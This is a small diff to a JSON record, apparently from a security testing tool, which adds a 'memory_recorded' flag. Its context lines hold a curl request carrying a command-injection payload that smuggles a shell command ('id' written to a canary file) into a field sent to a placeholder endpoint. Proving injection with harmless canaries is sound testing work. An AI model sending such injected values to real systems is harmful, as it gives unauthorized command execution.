@@ -62,5 +62,6 @@
       "body": "# Sends a benign canary command via the injection sink.\n# Replace <ENDPOINT> with the discovered command surface.\ncurl -sX POST \"<ENDPOINT>\" \\\n     --data 'actuator=\"; id > /tmp/atk_canary; #\"'\n"
     }
   ],
-  "redacted": []
+  "redacted": [],
+  "memory_recorded": true
 }
